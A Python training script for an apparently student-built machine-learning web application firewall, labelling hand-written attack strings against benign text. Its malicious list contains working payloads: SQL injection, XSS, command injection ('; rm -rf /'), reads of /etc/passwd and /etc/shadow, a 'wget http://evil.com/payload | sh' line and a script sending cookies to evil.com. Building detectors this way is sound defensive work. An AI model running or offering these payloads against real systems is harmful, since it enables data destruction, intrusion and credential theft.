import os
import joblib
import random
import numpy as np
import pandas as pd
from sklearn.model_selection import StratifiedKFold, cross_val_predict
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import make_pipeline
from sklearn.metrics import classification_report, confusion_matrix
import string


# ---------------------------------
# 1. LARGE MALICIOUS DATASET
# ---------------------------------

malicious_payloads = [

    # SQL Injection
    "SELECT * FROM users WHERE id=1",
    "1 OR 1=1",
    "' OR '1'='1",
    "admin' --",
    "SELECT username, password FROM users",
    "DROP TABLE accounts",
    "UNION SELECT credit_card FROM customers",
    "INSERT INTO users VALUES ('hack')",
    "UPDATE users SET password='hacked'",

    # XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1337)>",
    "\" onmouseover=\"alert(1)",
    "<iframe src=javascript:alert('xss')>",

    # Command Injection
    "; rm -rf /",
    "&& cat /etc/passwd",
    "| ls -la",
    "`shutdown -h now`",
    "$(reboot)",

    # Path Traversal
    "../etc/passwd",
    "../../../../../etc/shadow",
    "..\\..\\windows\\system32\\cmd.exe",
    "/../../boot.ini",

    # Remote File Inclusion (RFI)
    "http://evil.com/shell.txt",
    "https://malware.cc/backdoor.php",

    # OS Shell Abuse
    "system('ls')",
    "exec('/bin/sh')",
    "wget http://evil.com/payload | sh",

    # SQLi advanced payloads
    "'; EXEC xp_cmdshell('dir'); --",
    "UNION SELECT NULL,NULL,NULL--",
    "SELECT LOAD_FILE('/etc/passwd')",

    # Misc Exploit Payloads
    "<script>document.location='http://evil.com?cookie=' + document.cookie</script>",
    "cat /etc/shadow",
]


# Duplicate malicious + noise
mal_texts = []
for txt in malicious_payloads:
    for _ in range(50):  # 50 variants each = ~1500 malicious samples
        noisy = txt
        # Add random noise
        if random.random() < 0.4:
            noisy = noisy.lower()
        if random.random() < 0.3:
            noisy += " --"
        if random.random() < 0.2:
            noisy = noisy.replace(" ", random.choice(["  ", "%20", "+"]))

        mal_texts.append(noisy)

mal_labels = [1] * len(mal_texts)


# ---------------------------------
# 2. LARGE BENIGN DATASET
# ---------------------------------

benign_sentences = [

    # User messages
    "Hello, how are you?",
    "This is a normal sentence.",
    "I love machine learning!",
    "The weather is great today.",
    "User clicked the login button.",
    "Fetching product list.",
    "Profile updated successfully.",
    "Normal request from Mehak.",
    "This firewall project is awesome!",

    # Clean API calls
    "GET /index.html HTTP/1.1",
    "POST /api/register",
    "GET /products?page=2&sort=asc",
    "DELETE /cart/item/4",
    "PUT /update/profile",

    # Clean URLs
    "/assets/logo.png",
    "/images/profile.jpg",
    "/documents/report.pdf",

    # Form submissions
    "name=mehak&email=mehak@example.com",
    "search=iphone14&type=latest",

    # Random harmless text
    "hello world program",
    "I am testing the AI firewall",
    "Send me the details tomorrow."
]


ben_texts = []
for txt in benign_sentences:
    for _ in range(60):  # 60 variants each = ~1500 benign samples
        noisy = txt
        if random.random() < 0.3:
            noisy = noisy.lower()
        if random.random() < 0.2:
            noisy += "   "
        ben_texts.append(noisy)

# Add random harmless garbage text
for _ in range(600):
    rand = ''.join(random.choices(string.ascii_letters + "      ", k=random.randint(20, 80)))
    ben_texts.append(rand)

# ---------------------------------
# EXTRA: MASSIVE BENIGN NOISE SECTION
# ---------------------------------

# 1) Short benign strings
short_benign = [
    "hi", "hello", "ok", "test", "this", "this is", "good", "nice", "cool",
    "yes", "no", "fine", "thank you", "lol", "haha", "hmm", "h"
]
for txt in short_benign:
    for _ in range(80):
        ben_texts.append(txt)

# 2) Random English-like text
words = ["tree", "apple", "car", "road", "firewall", "machine", "learning", 
         "hello", "sunset", "random", "weather", "name", "email"]
for _ in range(600):
    sent = " ".join(random.choices(words, k=random.randint(3, 12)))
    ben_texts.append(sent)

# 3) Random garbage strings that are STILL safe
for _ in range(600):
    garbage = ''.join(random.choices(string.ascii_letters + "      1234567890", k=random.randint(5, 60)))
    ben_texts.append(garbage)

# 4) Very long benign paragraphs
long_texts = [
    "This is a long paragraph describing normal user behavior on a website. "
    "There is nothing harmful or malicious, it is just plain text used for training a web application firewall.",
    "Users frequently write comments, reviews, or feedback that contain many normal words but no malicious intent."
]
for txt in long_texts:
    for _ in range(50):
        ben_texts.append(txt)
ben_labels = [0] * len(ben_texts)

# ---------------------------------
# 3. COMBINE INTO DATAFRAME
# ---------------------------------

texts = mal_texts + ben_texts
labels = mal_labels + ben_labels

df = pd.DataFrame({"text": texts, "label": labels})
df = df.sample(frac=1, random_state=42).reset_index(drop=True)

print("Dataset Size:", len(df))
print(df["label"].value_counts())


# ---------------------------------
# 4. BUILD MODEL (TF-IDF + Logistic Regression)
# ---------------------------------

pipeline = make_pipeline(
    TfidfVectorizer(ngram_range=(1, 3), max_features=12000),
    LogisticRegression(max_iter=2000, class_weight="balanced", random_state=42)
)


# ---------------------------------
# 5. CROSS VALIDATION REPORT
# ---------------------------------

skf = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)

preds = cross_val_predict(pipeline, df["text"], df["label"], cv=skf, method="predict")

print("\n----- Classification Report (5-Fold CV) -----")
print(classification_report(df["label"], preds))

print("\n----- Confusion Matrix -----")
print(confusion_matrix(df["label"], preds))


# ---------------------------------
# 6. TRAINING FINAL MODEL & SAVE
# ---------------------------------

pipeline.fit(df["text"], df["label"])
os.makedirs("app/models", exist_ok=True)
joblib.dump(pipeline, "app/models/waf_model.pkl")

print("\nModel saved to app/models/waf_model.pkl")
